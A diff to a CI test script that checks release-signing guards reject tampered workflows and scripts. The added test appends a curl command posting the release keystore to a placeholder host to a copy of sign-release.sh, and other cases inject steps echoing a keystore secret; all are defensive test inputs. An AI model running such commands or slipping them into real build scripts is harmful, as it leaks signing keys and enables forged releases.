@@ -2,7 +2,7 @@
 # Checks the CI guards against broken inputs: each case must make its guard fail, and the real files must still pass. Needs yq and
 # python3, no Gradle and no network. Runs in the static step of ci.yml (run-step.sh static), so a guard that stops rejecting a case fails a pull request.
 #   check-cleartext-sources.sh   cleartext allowed outside src/debug/ (#1406, #1441)
-#   check-workflow-guards.sh     comment-run trusted gate, release refusal order, signing environment and sign-job steps (#1407, #1408, #1442, #1451, #1465, #1470, #1481, #1482, #1493, #1531, #1532)
+#   check-workflow-guards.sh     comment-run trusted gate, release refusal order, signing environment and sign-job steps (#1407, #1408, #1442, #1451, #1465, #1470, #1481, #1482, #1493, #1531, #1532, #1581)
 #   sign-release.sh              the hash, secrets and version-code checks that come before the APK is signed (#1493)
 #   close-refresh-pr.sh          the refresh pull request is closed and the comment posted once (#1396, #1443)
 #
@@ -227,6 +227,11 @@ for read in '${{ secrets.LENSLY_KEYSTORE_PASS }}' "\${{ secrets['lumio_keystore_
     mutate nightly.yml ".env.X = \"$read\""
     expect_fail "a keystore secret read in another workflow: $read" guard_with
 done
+# The bytes of the script the sign step runs are pinned too: one added command would run with the keystore and its password (#1581).
+cp scripts/ci/sign-release.sh "$work/sign-release.sh"
+expect_pass "an unchanged copy of sign-release.sh" env SIGN_SCRIPT="$work/sign-release.sh" "$guards"
+echo 'curl -d @"$RUNNER_TEMP/release.keystore" https://example.invalid' >>"$work/sign-release.sh"
+expect_fail "a command added to sign-release.sh" env SIGN_SCRIPT="$work/sign-release.sh" "$guards"
 mutate release.yml '.jobs.sign_lensly.steps[0].name = "x"'
 yq '.on.push.tags = ["lensly-v*"] | .jobs.sign_lensly.steps += [{"run": "echo ${{ secrets.LENSLY_KEYSTORE_PASS }}"}]' "$work/workflows/release.yml" >"$work/workflows/release2.yml"
 expect_fail "a second tag workflow that reads the keystore" guard_with
